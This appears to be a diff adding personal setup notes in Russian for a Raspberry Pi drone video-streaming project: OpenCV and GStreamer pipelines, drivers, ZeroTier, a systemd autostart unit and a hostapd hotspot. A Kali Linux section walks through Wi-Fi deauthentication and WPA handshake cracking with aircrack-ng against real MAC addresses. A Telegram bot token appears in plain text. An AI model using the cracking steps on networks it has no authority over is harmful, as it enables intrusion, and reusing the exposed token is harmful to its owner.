@@ -1,0 +1,730 @@
+﻿MCP протокол
+
+https://github.com/alduxvm/pyMultiWii
+cd pyMultiWii
+sudo pip install .
+
+git clone https://github.com/alduxvm/pyMultiWii.git
+
+
+https://github.com/thecognifly/YAMSPy/blob/master/Examples/PS4_Joystick/ps4_joystick_async.py
+
+===================================================================================
+https://habr.com/ru/post/414587/ Дрон на 4Г
+====================================================================
+
+https://github.com/PhysicsX/Gstreamer-on-embedded-devices Гит хаб разраба по Жстримеру
+
+
+https://routerus.com/how-to-install-opencv-on-raspberry-pi как установить 
+
+/
+https://lesson.iarduino.ru/page/machine-vision-raspberry урок с програмой на питоне
+
+
+
+---------------------------------------------------------
+
+
+---------------------------------------------------------
+
+
+чтоб сработало опенCV нужно установить пакеті из 
+https://github.com/TrashRobotics/CVbot/blob/main/README.md 
+и также после єтого  
+
+
+Загружаем питоновый менеджер пакеты и вспомогательные пакеты
+
+sudo apt install python3-dev python3-pip python3-numpy
+--------
+Загружаем еще немного зависимостей
+
+pip3 install --upgrade pip setuptools wheel
+pip3 install flask pyserial 
+------------
+Загружаем openCV
+
+sudo apt install python3-opencv
+
+------------
+
+и также после єтого
+pip install imutils 
+
+
+
+
+
+-----------
+
+
+
+
+cd CVbot/python_app
+python3 app.py -i 192.168.0.113
+
+
+---------------------------------------------------------------------------------------------------------------------
+sudo apt install git установка библиотеки для GIT
+
+sudo raspi-config для конфигурации 
+
+nano file редактор файлов
+
+cd вернуться в корень
+
+ls  посмотреть содержимое каталога
+
+sudo -s права суперпользователя root
+
+mkdir папка создать папку
+
+--переименовать
+https://www.hostinger.com.ua/rukovodstva/kak-pereimenovat-fail-linux
+mv file1.txt file2.txt
+rename ‘s/file1/newfile1/’ file1.txt
+
+python3 test.py запустить приложение
+
+python3 -c "import cv2; print(cv2.__version__)" глянуть версию
+
+sudo halt Отключение малинки
+
+
+---------------------------------------------------------------------------------------------
+sudo apt-get install libwayland-client
+
+https://ru.code-paper.com/python/examples-installing-opencv-version-3-3     OPENCV3версии установка
+
+--------------------------------------------------------------------------------------------------------------------
+для полноценной установки openCV
+sudo apt install librsvg2-common
+sudo apt install libwayland-client0
+
+============================================================================================================
+https://gist-github-com.translate.goog/AmitThakur/8382707?_x_tr_sl=en&_x_tr_tl=ru&_x_tr_hl=ru&_x_tr_pto=sc
+
+sudo apt-get install build-essential cmake pkg-config
+
+-------------------------------------------
+
+ДЛЯ установки драйвера на НЕТГИР
+https://github-com.translate.goog/morrownr/8821au-20210708/blob/main/README.md?_x_tr_sl=en&_x_tr_tl=ru&_x_tr_hl=ru&_x_tr_pto=sc
+
+sudo apt update && sudo apt upgrade
+sudo reboot
+sudo apt install -y raspberrypi-kernel-headers build-essential bc dkms git
+mkdir -p ~/src
+cd ~/src
+git clone https://github.com/morrownr/8821au-20210708.git
+cd ~/src/8821au-20210708
+./cmode-on.sh
+./ARM_RPI.sh
+получается перед установкой нужно удалить старій, и без обнові не устанавливается
+
+sudo ./install-driver.sh
+
+
+192.168.0.102
+
+/etc/modprobe.d/8821au.conf настройки
+
+
+==============================================================================================================
+
+CD перход в папку 
+LS смотрим что в папке -l подробней
+TOUCH создание файла
+NANO редактирование файла
+MKDIR создание папки
+CP копирование файла
+MV перемещение файла
+RM удаление файла
+rm -rf DIR удаление директории вместе с содержимим
+ls /dev/sd* посмотреть флешки в ЮСБ
+ which <file> нати фаил
+lsusb -t посмотреть порті ЮСБ
+
+війти из руут просто нажать CTRL+D
+
+
+
+===============================================================================================
+ПІТАМСЯ ОСВОИТЬ ЖСТРИМЕР передача видео на порт UDP
+
+$ sudo apt-get update
+$ sudo apt-get upgrade -y
+$ sudo apt-get install gstreamer1.0-tools
+$ sudo apt-get install gstreamer1.0-plugins-good
+$ sudo apt-get install gstreamer1.0-plugins-bad
+$ sudo apt-get install gstreamer1.0-plugins-ugly
+$ sudo apt-get install libglib2.0-dev
+$ sudo apt-get install libgstreamer1.0-dev
+$ sudo apt-get install libgstreamer-plugins-base1.0-dev
+
+или так..
+
+ sudo apt-get install gstreamer1.0-tools gstreamer1.0-plugins-good gstreamer1.0-plugins-bad gstreamer1.0-plugins-ugly libglib2.0-dev libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev -y
+------------------------------------------------------------------------
+
+gst-launch-1.0 videotestsrc ! decodebin ! videoconvert ! x264enc ! rtph264pay ! udpsink host=192.168.0.111 port=5600 sync=false   робоча
+
+
+gst-launch-1.0 udpsrc address=192.168.0.111 port=5600 caps="application/x-rtp,media=(string)video,encoding-name=(string)H264,clock-rate=(int)90000" ! decodebin ! autovideosink Sync=false
+
+-------------------------------------
+
+
+gst-launch v4l2src device=/dev/video0 ! 'video/x-raw-yuv,width=640,height=480' !  x264enc pass=qual quantizer=20 tune=zerolatency ! rtph264pay ! udpsink host=127.0.0.1 port=1234
+
+gst-launch-1.0 udpsrc port=1234 ! "application/x-rtp, payload=127" ! rtph264depay ! ffdec_h264 ! xvimagesink sync=false
+-------------------------------------------
+
+gst-launch-1.0 -v videotestsrc ! decodebin ! videoconvert ! x264enc tune=zerolatency ! rtph264pay ! udpsink host=localhost port=5000 
+много печатает потом запускается
+
+
+gst-launch-1.0 udpsrc port=5000 ! application/x-rtp,media=video,clock-rate=90000,encoding-name=H264,payload=96 ! rtph264depay ! avdec_h264 ! autovideosink
+
+gst-launch-1.0 udpsrc port=5000 ! application/x-rtp,media=video,clock-rate=90000,encoding-name=H264,payload=96 ! rtph264depay ! avdec_h264 ! decodebin ! autovideosink sync=false
+
+gst-launch-1.0 -v fdsrc ! h264parse ! rtph264pay config-interval=1 pt=35 ! udpsink sync=false host=127.0.0.1 port=5600
+
+РАБОЧИЕ---------------------------------------------------------------
+gst-launch-1.0 videotestsrc is-live=true ! video/x-raw,framerate=25/1 ! videoconvert ! x264enc ! h264parse ! rtph264pay pt=96 ! udpsink host=192.168.0.110 port=5000  передаем видео
+
+gst-launch-1.0 -v udpsrc port=5000 ! application/x-rtp,clock-rate=90000,payload=96 ! rtph264depay ! h264parse ! avdec_h264 ! videoconvert ! ximagesink получаем видео
+
+gst-launch-1.0 v4l2src ! video/x-raw,height=300,width=300,framerate=30/1 ! videoconvert ! x264enc ! h264parse ! rtph264pay pt=96 ! udpsink host=192.168.0.110 port=5000
+
+запись в МП4 рабоча
+gst-launch-1.0 -e udpsrc port=5000 ! application/x-rtp, clock-rate=90000,payload=96  ! rtph264depay ! video/x-h264 ! queue ! h264parse ! queue ! mp4mux ! filesink location=bleh.mp4
+
+
+
+gst-launch-1.0 -v udpsrc port=5000 ! application/x-rtp,clock-rate=90000,payload=96 ! rtph264depay ! h264parse ! avdec_h264 ! autovideoconvert ! autovideosink получаем видео
+
+
+ХОРОШО РАБОТАЕТ==========================================================
+
+raspivid -n  -ex fixedfps -w 640 -h 480 -b 4000000 -fps 30 -vf -hf -t 0 -o - |                gst-launch-1.0 -v fdsrc ! h264parse ! rtph264pay config-interval=1 pt=35 ! udpsink sync=false host=192.168.0.100 port=5600
+
+raspivid -n  -ex fixedfps -w 640 -h 480 -b 4000000 -fps 30 -vf -hf -t 0 -o - |                gst-launch-1.0 -v fdsrc ! h264parse ! rtph264pay config-interval=1 pt=35 ! udpsink sync=false host=192.168.50.196 port=5600
+
+
+адрес нужно указівать устройство на которое передаем
+
+-------------------------------------------------------
+-sh(острота-100*100) -br(яркость0*100) -sa(насіщеность-100*100) -co(-100*100контраст)
+
+как пример передаем через Zerotier на удаленній адрес:
+
+raspivid -n  -ex fixedfps -w 640 -h 480 -b 4000000 -fps 30 -vf -hf -br 55 -gps -t 0 -o - |                gst-launch-1.0 -v fdsrc ! h264parse ! rtph264pay config-interval=1 pt=35 ! udpsink sync=false host=192.168.192.235 port=5600
+----------------------------------------------------
+принимаем на малинке:
+
+gst-launch-1.0 udpsrc port=5600 caps='application/x-rtp, media=(string)video, clock-rate=(int)90000, encoding-name=(string)H264'                ! rtph264depay ! avdec_h264 ! videoconvert ! ximagesink
+
+10.32.237.69 
+
+
+
+РАСПБЕРРИ + 4Г===================================================
+https://clover.coex.tech/ru/4g.html
+
+
+
+
+ПІтаемся передать RTPS видеO 4G============================================================
+
+$ sudo apt-get update
+$ sudo apt-get upgrade -y
+$ sudo reboot
+---------------------------------------------
+устанавливаем Zerotail для плагин для соединения IP удаленіх адресов
+curl -s 'https://raw.githubusercontent.com/zerotier/ZeroTierOne/master/doc/contact%40zerotier.com.gpg' | gpg --import && \
+if z=$(curl -s 'https://install.zerotier.com/' | gpg); then echo "$z" | sudo bash; fi
+
+подключаемся к ресурсу и проверяем
+sudo zerotier-cli join db64858fedb260b0 тут вводим индефикатор
+должно 200 join OK
+-----------------------------------------------
+
+устанавливаем ЖСтример
+
+
+sudo apt-get install gstreamer1.0-tools gstreamer1.0-plugins-good gstreamer1.0-plugins-bad gstreamer1.0-plugins-ugly libglib2.0-dev libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev -y
+----------------------------------
+$ git clone https://github.com/thaytan/gst-rpicamsrc.git
+$ sudo apt-get install autoconf automake libtool pkg-config libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev libraspberrypi-dev
+$ cd ...... 
+
+$ ./autogen.sh --prefix=/usr --libdir=/usr/lib/arm-linux-gnueabihf/
+$ make
+$ sudo make install
+----------------------
+
+затем установить rtsp сервер, он помог на обоих
+
+$ wget https://gstreamer.freedesktop.org/src/gst-rtsp-server/gst-rtsp-server-1.10.4.tar.xz
+$ tar -xf gst-rtsp-server-1.10.4.tar.xz 
+$ cd gst-rtsp-server-1.10.4
+$ ./configure 
+$ make
+$ sudo make install
+-----------------------------------------------
+
+не забіваем включить камеру и шину SPI в конфигураторе
+sudo raspi-config
+
+---------------------------------------------
+
+запускаем rtsp-сервер на передающей малинке: 
+
+cd gst-rtsp-server-1.10.4/examples && ./test-launch --gst-debug=3 "( rpicamsrc bitrate=8000000 awb-mode=tungsten preview=false ! video/x-h264, width=640, height=480, framerate=30/1 ! h264parse ! rtph264pay name=pay0 pt=96 )"
+
+єто запускаем на приемной машине с АйПи ,вводим передающей
+
+gst-launch-1.0 -v rtspsrc location=rtsp://192.168.0.110:8554/test latency=0 buffer-mode=auto ! decodebin ! videoconvert ! ximagesink
+
+єто вводим в поток VLCплеера
+rtsp://192.168.0.110:8554/test тестируем поток на VLCplayer АЙПИ адрес от передающей малинки
+---------------------------------------------------------
+
+для того чтоб глянуть поток с удаленого клиента нужно там также установмить плагин Zerotier , тогда все очень хорошо работает!!!
+===============================================================
+
+
+
+
+
+
+
+пітаемся вівести через http
+
+raspivid -o - -t 0 -hf -w 800 -h 400 -fps 24 |clvc -vvv stream:///dev/stdin --sout '#standard{acces=http,mux=ts,dst=:8160}' :demux=h264 
+------------------
+https://4youngpadawans-com.translate.goog/stream-live-video-to-browser-using-gstreamer/?_x_tr_sch=http&_x_tr_sl=en&_x_tr_tl=ru&_x_tr_hl=ru&_x_tr_pto=sc 
+
+немного инфі по теме
+
+https://clover.coex.tech/ru/4g.html еще по4Г
+
+192.168.192.71
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+====================================================================
+
+_____________ KALI LINUX________________________________________
+
+
+https://zalinux.ru/?p=4986 драйвер для 8812au
+
+https://spy-soft.net/wifi-hacking/  Туториал по взлому
+
+
+
+
+
+
+---------
+
+
+- ifconfig     
+- airmon-ng check kill
+- airmon-ng start wlan0
+- airodump-ng wlan0mon
+- airodump-ng --bssid [MAC адрес точки доступа – без скобок!] --channel 1 -w wifi wlan0mon
+- aireplay-ng --deauth 20 -a [MAC точки доступа] -c [MAC подключенного клиента] wlan0mon
+- wpaclean ИмяНовогоФайла ИмяСтарогоФайла
+- aircrack-ng -w [ПутьКСловарю] -b [MAC точки доступа] [ЧистыйХэндшейк .cap]
+
+
+
+
+iwconfig ---Проверяем подключеніе модемі
+
+ifconfig wlan1 down ---нужній отключаем
+
+iwconfig wlan1 mode monitor ---переводим нужній модем в режим монитор    
+
+ifconfig wlan1 up  ---включаем модем
+
+iwconfig  ---убеждаемся что нужній модем в режиме монитор
+
+airmon-ng check kill  ---если надо , отключаем лишние процессі
+
+airmon-ng start wlan1 ---стартуем на нужном модеме
+
+airodump-ng wlan1 ---смотрим вокруг
+
+airodump-ng --bssid D4:6E:0E:26:8F:CA --channel 10 -w Desktop/wifi/mywifi wlan1
+
+запускаем сканирование нужной сети, вводим заодно номер канала, название файла, которій ложим в нужную папку, номер модема..............глядим сверху ,ждем рукопожатия
+
+
+aireplay-ng --deauth 20 -a D4:6E:0E:26:8F:CA -c 20:47:DA:7E:07:35 wlan1 в паралельном окне вірубаем пользователя и ждем его повторного подключения ,для определения рукопожатия
+
+
+
+wpaclean Desktop/wifi/clean_hand Desktop/wifi/mywifi-04.cap очищаем фаил от лишнего мусора и сохраняем заново 
+
+
+
+
+aircrack-ng -w Desktop/wifi/1datas.txt -b D4:6E:0E:26:8F:CA Desktop/wifi/clean_hand.cap
+теперь можно подключить фаил с словарем , обозначить сеть , и тот фаил в котором лежит рукопожатие
+
+
+
+
+
+--------------------------------------------------------------
+
+для установки на Дебиан (для Зеро сработало)
+https://github-com.translate.goog/morrownr/8812au-20210629?_x_tr_sl=en&_x_tr_tl=ru&_x_tr_hl=ru&_x_tr_pto=sc
+
+
+sudo apt install -y raspberrypi-kernel-headers build-essential bc dkms git зависимости для
+ установки драйвера для 8812
+
+git clone https://github.com/aircrack-ng/rtl8812au
+
+cd rtl*
+sudo make dkms_install
+
+
+
+sudo apt install libnl-dev
+sudo apt install libnl-3-dev
+
+
+sudo apt install libnl-genl-3-dev
+
+sudo apt-get update
+sudo apt-get install -y aircrack-ng
+
+
+ D4:6E:0E:26:8F:CA  B8:27:EB:7E:4B:FA  -32   24e-24e     0      825
+ D4:6E:0E:26:8F:CA  74:E5:43:42:FF:B0  -56    0 -24e     0      259
+ D4:6E:0E:26:8F:CA  BC:DD:C2:9E:14:70  -67   24e- 6      0      114
+ D4:6E:0E:26:8F:CA  EC:FA:BC:25:B7:5F  -75   24e- 6      0       48
+ D4:6E:0E:26:8F:CA  A0:20:A6:30:78:13  -77   24e- 6      0       61
+ D4:6E:0E:26:8F:CA  00:7E:56:9F:58:F0  -79    0 - 1e     0        3
+ D4:6E:0E:26:8F:CA  20:47:DA:7E:07:35  -93    1e- 1e     0     3934         Home
+ D4:6E:0E:26:8F:CA  74:EE:2A:6C:68:33   -1    1e- 0      0        4
+ D4:6E:0E:26:8F:CA  A8:96:75:FC:78:A2 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+КАМЕРА 327====================================================================
+
+http://wiki.veye.cc/index.php/VEYE-MIPI-290/327_for_Raspberry_Pi
+
+http://wiki.veye.cc/index.php/V4L2_mode_for_Raspberry_Pi#Stream_to_OpenCV
+
+http://wiki.veye.cc/index.php/Build_drivers_from_source_for_rpi лрайверва вручную
+
+http://wiki.veye.cc/index.php/VEYE-MIPI-290/327_for_Raspberry_Pi#RPI_Computer_Module_and_RPI_Zero_Additional_Info
+
+ПРОСТО ВІВОД ЧЕРЕЗ ЖСТРИМЕР
+gst-launch-1.0 v4l2src device=/dev/video0 ! "video/x-raw,format=(string)UYVY, width=(int)1920, height=(int)1080,framerate=(fraction)30/1"  ! videoconvert ! videoscale ! clockoverlay time-format="%D %H:%M:%S" ! video/x-raw, width=640, height=360 ! autovideosink sync=false -v
+
+НАПРЯМУЮ НА ЄКРАН
+gst-launch-1.0 v4l2src device=/dev/video0 ! "video/x-raw,format=(string)UYVY, width=(int)1920, height=(int)1080,framerate=(fraction)30/1"  ! videoconvert ! videoscale ! clockoverlay time-format="%D %H:%M:%S" ! video/x-raw, width=640, height=360 ! fbdevsink sync=false -v
+
+
+ПО UDP РАБОТАЕТ
+cd ~/raspberrypi/veye_raspcam/bin && ./veye_raspivid -b 4000000 -t 0 -o -  | gst-launch-1.0 -v fdsrc ! h264parse ! rtph264pay config-interval=1 pt=35 ! udpsink sync=false host=192.168.0.101 port=5600
+
+gst-launch-1.0 udpsrc port=5000 caps="application/x-rtp,media=(string)video,encoding-name=(string)H264,clock-rate=(int)90000" ! decodebin ! autovideosink Sync=false
+
+
+если с нуля не забіваем Жстример
+
+cd raspberrypi/veye_raspcam/bin/ && ./veye_raspipreview -t -1
+
+cd raspberrypi/veye_raspcam/bin/ && ./veye_raspivid -t 60000 -o ~/test.h264
+
+если не работает, установлена библиотека 412
+
+------------- 
+ПІТАЕМСЯ Rtsp
+
+cd gst-rtsp-server-1.10.4/examples
+
+./test-launch '( v4l2src device=/dev/video0 ! videoconvert ! queue ! x264enc tune="zerolatency" byte-stream=true bitrate=4000 ! rtph264pay name=pay0 pt=96 )'   ---Работает но с ошибкой и задержкой
+
+./test-launch --gst-debug=3 "( v4l2src device=/dev/video0 ! videoconvert ! queue ! x264enc tune="zerolatency" byte-stream=true bitrate=4000 ! video/x-h264, width=1920, height=1080, framerate=30/1 ! h264parse ! rtph264pay name=pay0 pt=96 )"      ------Работает без ошибки но с задержкой
+
+pi@TXrasp:~/gst-rtsp-server-1.10.4/examples $ ./test-launch "( v4l2src device=/dev/video0 ! videoconvert ! video/x-raw,format=I420 ! x264enc tune="zerolatency" byte-stream=true bitrate=10000 ! rtph264pay name=pay0 pt=96 )"   ---------вообще избавился от ошибок но не открівает VLC
+ 
+
+cd gst-rtsp-server-1.10.4/examples
+$ ./test-launch --gst-debug=3 "( rpicamsrc bitrate=8000000 awb-mode=tungsten preview=false ! video/x-h264, width=640, height=480, framerate=30/1 ! h264parse ! rtph264pay name=pay0 pt=96 )"
+
+--------------------
+ПІТАЕМСЯ ТСР
+gst-launch-1.0 -v v4l2src device=/dev/video0 num-buffers=-1 ! "video/x-raw,format=(string)UYVY, width=(int)1920, height=(int)1080,framerate=(fraction)30/1" ! v4l2h264enc extra-controls="controls, h264_profile=4, video_bitrate=4000000" ! 'video/x-h264, profile=high, level=(string)4' ! h264parse ! rtph264pay config-interval=1 pt=96 ! gdppay ! tcpserversink  host=192.168.0.108 port=5000
+
+ПРИНИМАЕМ
+gst-launch-1.0 -v tcpclientsrc host=192.168.0.108 port=5000 ! gdpdepay ! rtph264depay ! avdec_h264 ! autovideosink sync=false
+
+
+Инструменті для передачи видео по UDP
+
+git clone https://github.com/veyeimaging/raspberrypi.git
+
+
+sudo apt-get update && sudo apt-get install libopencv-dev
+sudo apt-get install python3-opencv
+sudo apt-get install libzbar-dev
+
+
+---------------------------------
+4.1 Загрузите драйвер 
+
+
+перед єтим устанавливаем Жстример
+
+sudo apt-get install gstreamer1.0-tools
+
+sudo apt-get install libx264-dev libjpeg-dev
+
+sudo apt-get install libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev libgstreamer-plugins-bad1.0-dev gstreamer1.0-plugins-ugly gstreamer1.0-tools gstreamer1.0-gl gstreamer1.0-gtk3
+--------------------------------
+wget https://github.com/veyeimaging/raspberrypi_v4l2/releases/latest/download/raspberrypi_v4l2.tgz
+
+4.2 Установите драйвер
+tar -xzvf raspberrypi_v4l2.tgz
+
+cd raspberrypi_v4l2/release/
+
+chmod +x *
+
+sudo ./install_driver.sh veyecam2m
+
+-------------
+
+dmesg | grep veye проверка на наличие
+
+ls /dev/video0
+
+v4l2-ctl --list-formats-ext
+
+uname -a проверка версии РАСПИ должна біть не больше Linux ZERO 5.15.61-v7+
+ато не установится v412
+
+
+cd raspberrypi_v4l2/release/
+sudo ./uninstall_driver.sh veyecam2m
+sudo ./uninstall_driver.sh veye327
+
+
+
+
+
+
+
+
+
+
+
+OФОРМЛЯЕМ АВТОЗАПУСК=============================================
+
+sudo nano /etc/rc.local
+ ставляем то что нам нужно
+
+systemctl list-unit-files можно глянуть запущеніе юниті
+
+
+https://github.com/kirumipat/SYSTEMD-UNIT для обновленой ЗЕРО работает
+
+
+cd /lib/systemd/system
+sudo systemctl status mystart.service
+sudo systemctl stop mystart.service
+sudo systemctl disable mystart.service
+
+sudo systemctl start mystart.service
+sudo systemctl enable mystart.service
+systemctl daemon-reload 
+--------------------------------------------------
+#!/bin/bash
+############-YOU SCRIPT-##############
+touch /"$(date +"%d-%m-%Y-%r")"
+######################################
+
+---------------------------------------------
+
+cd /etc/systemd/system
+
+sudo nano mystart.service
+
+[Unit]
+# описание
+Description=MYSTART
+# здесь используется ключи времени с указанием цели или другой службы
+After=default.target
+
+[Service]
+# от какого пользователя запускать службу, не обязательно
+User=root
+# перезапуск службы, не обязательно
+Restart=on-failure
+# выполняемая команда Вместо NAME имя пользователя или просто другой путь где у вас лежит скрипт
+ExecStart=/home/NAME/mystart.sh
+
+[Install]
+# здесь используется ключи времени с указанием цели или другой службы
+WantedBy=default.target
+
+
+sudo systemctl start mystart.service
+
+
+sudo systemctl enable mystart.service
+
+
+
+
+
+
+в файле для автозапуска
+python3 /home/pi/opencv.py так работает супер
+
+cd raspberrypi/veye_raspcam/bin/ ; ./veye_raspipreview -t 20000 -p '0,0,1280,720'
+
+ cd raspberrypi/veye_raspcam/bin/&&./veye_raspipreview -t -1
+
+70:5F:A3:A0:5B:D6
+
+
+ОФОРМЛЯЕМ ПОДКЛЮЧЕНИЕ ПО ТОЧКЕ ДОСТУПА==============================
+
+sudo apt update
+sudo apt install hostapd
+sudo systemctl stop hostapd
+sudo systemctl stop dnsmasq
+
+
+sudo nano /etc/hostapd/hostapd.conf
+
+interface=wlan0
+driver=nl80211
+ssid=RPiHotSpot
+hw_mode=g
+channel=6
+wmm_enabled=0
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=2
+wpa_passphrase=1234567890
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+
+
+
+sudo systemctl unmask hostapd
+sudo systemctl enable hostapd
+
+sudo nano /etc/default/hostapd
+
+DAEMON_CONF="/etc/hostapd/hostapd.conf"
+
+sudo nano /etc/dnsmasq.conf
+
+в самом конце
+
+#RPiHotspot config - No Intenet
+interface=wlan0
+domain-needed
+bogus-priv
+dhcp-range=192.168.50.150,192.168.50.200,255.255.255.0,12h
+
+sudo nano /etc/network/interfaces
+
+ставим # на всех строчках
+
+sudo nano /etc/dhcpcd.conf
+
+в самом низу
+
+interface wlan0
+nohook wpa_supplicant
+static ip_address=192.168.50.10/24
+static routers=192.168.50.1
+
+sudo nano /etc/dnsmasq.conf
+
+#RPiHotspot config - Internet
+interface=wlan0
+bind-dynamic 
+domain-needed
+bogus-priv
+dhcp-range=192.168.50.150,192.168.50.200,255.255.255.0,12h
+
+sudo reboot
+
+
+работает....
+https://www.raspberryconnect.com/projects/65-raspberrypi-hotspot-accesspoints/168-raspberry-pi-hotspot-access-point-dhcpcd-method
+
+заходими по pi@192.168.50.10
+
+
+
+
+
+ОФОРМЛЯЕМ ТЕЛЕГРАММ БОТА=============================================
+
+https://api.telegram.org/bot1400480972:AAEA9cYMMteTfV1KMJhmK_ntvsfHfS_Q030/getUpdates для теста апишка
+
+https://itproger.com/news/telegramm-i-koronavirus-pishem-bota-na-python-s-otslezhivaniem-dannih ссілка с образцом
+
+
+
+
+
+
